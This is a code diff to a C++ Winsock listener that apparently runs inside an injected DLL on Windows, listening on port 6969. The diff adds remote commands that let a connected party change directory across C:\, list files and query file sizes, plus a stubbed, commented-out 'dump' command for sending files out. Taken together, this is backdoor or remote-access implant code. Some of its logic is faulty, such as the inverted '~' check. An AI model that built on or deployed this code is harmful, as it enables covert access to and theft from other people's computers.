@@ -3,6 +3,7 @@
 #include "FSTraversal.h"
 #include <ws2tcpip.h>
 #include <iostream>
+#include <vector>
 
 #define SEND_PORT "1337"
 #define LISTEN_PORT "6969"
@@ -11,7 +12,7 @@
 wchar_t cur_dir[BUFFER_LEN];
 
 int ListenServer(void) {
-	lstrcpynW(cur_dir, L"C:\\*", 4);
+	lstrcpynW(cur_dir, L"C:\\", 4);
 	// https://docs.microsoft.com/en-us/windows/win32/winsock/initializing-winsock
 	WSADATA wsaData;
 
@@ -50,18 +51,9 @@ int ListenServer(void) {
 		else {
 			int recvbuflen = BUFFER_LEN;
 			char recvbuf[BUFFER_LEN];
+			memset(recvbuf, 0, BUFFER_LEN);
 
 			int iResult;
-
-			// shutdown the connection for sending since no more data will be sent
-			// the client can still use the ConnectSocket for receiving data
-			iResult = shutdown(ConnSock, SD_SEND);
-			if (iResult == SOCKET_ERROR) {
-				printf("[DLL] [LISTENER] Shutdown Failed: %d\n", WSAGetLastError());
-				closesocket(ConnSock);
-				WSACleanup();
-				return 1;
-			}
 
 			do {
 				iResult = recv(ConnSock, recvbuf, recvbuflen, 0);
@@ -70,9 +62,94 @@ int ListenServer(void) {
 					if (!strncmp(recvbuf, "ls", 2)) {
 						ReturnFiles(cur_dir);
 					}
+					else if (!strncmp(recvbuf, "ping", 4)) {
+						// Send a buffer
+						iResult = send(ConnSock, "pong", 4, 0);
+						if (iResult == SOCKET_ERROR) {
+							closesocket(ConnSock);
+							WSACleanup();
+							return 1;
+						}
+					}
+					else if (!strncmp(recvbuf, "cd ", 3)) {
+						std::string recv = recvbuf;
+						std::wstring wrecv = std::wstring(recv.begin(), recv.end());
+						memset(recvbuf, 0, BUFFER_LEN);
+						std::wstring wrecv_arg = wrecv.substr(3, wrecv.size() - 3);
+						if (wrecv_arg.back() != '\\') {
+							wrecv_arg += '\\';
+						}
+						if (ValidDir(wrecv_arg.c_str())) {
+							wcsncpy_s(cur_dir, wrecv_arg.c_str(), wrecv_arg.length());
+							// Send a buffer
+							char buffer[BUFFER_LEN];
+							memset(buffer, 0, BUFFER_LEN);
+							size_t   i;
+							wcstombs_s(&i, buffer, BUFFER_LEN, wrecv_arg.c_str(), BUFFER_LEN);
+							iResult = send(ConnSock, buffer, strlen(buffer), 0);
+							if (iResult == SOCKET_ERROR) {
+								closesocket(ConnSock);
+								WSACleanup();
+								return 1;
+							}
+						}
+						else if (wrecv_arg.compare(L"~")) {
+							wcsncpy_s(cur_dir, L"C:\\", 4);
+							// Send a buffer
+							iResult = send(ConnSock, "C:\\", 4, 0);
+							if (iResult == SOCKET_ERROR) {
+								closesocket(ConnSock);
+								WSACleanup();
+								return 1;
+							}
+						}
+						else {
+							// Send a buffer
+							iResult = send(ConnSock, "C:\\", 4, 0);
+							if (iResult == SOCKET_ERROR) {
+								closesocket(ConnSock);
+								WSACleanup();
+								return 1;
+							}
+						}
+					}
+					else if (!strncmp(recvbuf, "size ", 5)) {
+						std::string recv = recvbuf;
+						std::wstring wrecv = std::wstring(recv.begin(), recv.end());
+						memset(recvbuf, 0, BUFFER_LEN);
+						std::wstring wrecv_arg = wrecv.substr(5, wrecv.size() - 5);
+						
+						std::string filelen = FileSize(wrecv_arg.c_str());
+						iResult = send(ConnSock, filelen.c_str(), filelen.length(), 0);
+						if (iResult == SOCKET_ERROR) {
+							closesocket(ConnSock);
+							WSACleanup();
+							return 1;
+						}
+					}
+					else if (!strncmp(recvbuf, "dump ", 5)) {
+						/*
+						std::string recv = recvbuf;
+						std::wstring wrecv = std::wstring(recv.begin(), recv.end());
+						memset(recvbuf, 0, BUFFER_LEN);
+						std::wstring wrecv_arg = wrecv.substr(5, wrecv.size() - 5);
+
+						int fsize = FileSize(wrecv_arg.c_str());
+						std::vector<std::byte>;
+						iResult = send(ConnSock, "test", fsize, 0);
+						if (iResult == SOCKET_ERROR) {
+							closesocket(ConnSock);
+							WSACleanup();
+							return 1;
+						}
+						*/
+					}
 				}
 				else if (iResult == 0) {
 					printf("[DLL] [LISTENER] Connection closed\n");
+				}
+				// Timeout
+				else if (iResult == 10060){
 				}
 				else {
 					printf("[DLL] [LISTENER] recv failed: %d\n", WSAGetLastError());
